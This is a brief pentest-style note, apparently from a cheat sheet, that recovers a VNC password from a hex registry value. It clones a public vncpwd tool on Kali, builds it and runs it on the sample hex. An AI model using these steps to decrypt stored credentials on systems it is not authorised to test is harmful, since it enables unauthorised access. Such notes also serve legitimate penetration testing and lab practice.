#### Cracking hex VNC password
`"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`
```bash - kali
git clone https://github.com/jeroennijhof/vncpwd
```
```bash - kali
cd vncpwd
```
```bash - kali
sudo make
```
```bash - kali
./vncpwd <(echo '6bcf2a4b6e5aca0f' | xxd -r -p)
```
